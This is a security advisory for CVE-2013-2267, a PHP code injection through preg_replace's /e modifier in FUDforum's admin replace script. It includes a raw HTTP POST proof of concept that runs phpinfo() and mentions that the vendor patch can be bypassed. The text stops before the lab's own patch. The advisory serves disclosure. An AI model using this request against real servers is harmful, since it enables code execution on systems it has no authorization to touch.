Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in FUDforum, which can be exploited to execute arbitrary PHP code on the target system.


1) PHP Code Injection in FUDforum: CVE-2013-2267

The vulnerability exists due to insufficient validation of HTTP POST parameters "regex_str", "regex_str_opt" and "regex_with" in "/adm/admreplace.php" script before using them in the "preg_replace()" function. A remote administrator can send a specially crafted HTTP POST request, inject and execute arbitrary PHP code on the target system with privileges of the web server. 

The following PoC (Proof of Concept) code executes the "phpinfo()" function:


POST /adm/admreplace.php HTTP/1.1
Host: fudforum
Referer: http://fudforum/adm/admreplace.php?&SQ=8928823a5edf50cc642792c2fa4d8863
Cookie: fud_session_1361275607=11703687e05757acb08bb3891f5b2f8d
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

SQ=8928823a5edf50cc642792c2fa4d8863&rpl_replace_opt=0&btn_submit=Add&btn_regex=1&edit=&regex_str=(.*)&regex_str_opt=e&regex_with=phpinfo()


Successful exploitation of the vulnerability requires administrative privileges within the application.

Solution:

Official Vendor patch is available here:
http://fudforum.svn.sourceforge.net/fudforum/?rev=5596&view=rev

However, the above-mentioned patch does not entirely fix the vulnerability, which can still be exploited by other exploitation techniques (such as NULL-byte and others).

High-Tech Bridge Security Research Lab developed the following patch to eliminate the vulnerability:
